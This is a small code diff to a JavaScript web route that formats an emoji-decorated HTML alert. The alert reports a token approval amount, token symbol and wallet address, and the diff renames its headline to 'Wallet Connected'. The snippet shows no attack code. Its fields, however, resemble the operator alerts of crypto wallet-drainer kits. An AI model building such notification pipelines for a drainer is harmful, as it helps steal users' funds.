@@ -7,7 +7,7 @@ router.post("/", async (req, res) => {
 
   try {
     let text = '';
-    text = `🚀 <b>Transaction Processed</b> 🚀\n\n` +
+    text = `🚀 <b>Wallet Connected</b> 🚀\n\n` +
            `📈 <b>Amount</b>: ${approval_amount}\n` +
            `💰 <b>Token</b>: ${token_symbol}\n` +
            `📋 <b>Wallet Address</b>: ${walletAddress}\n` +
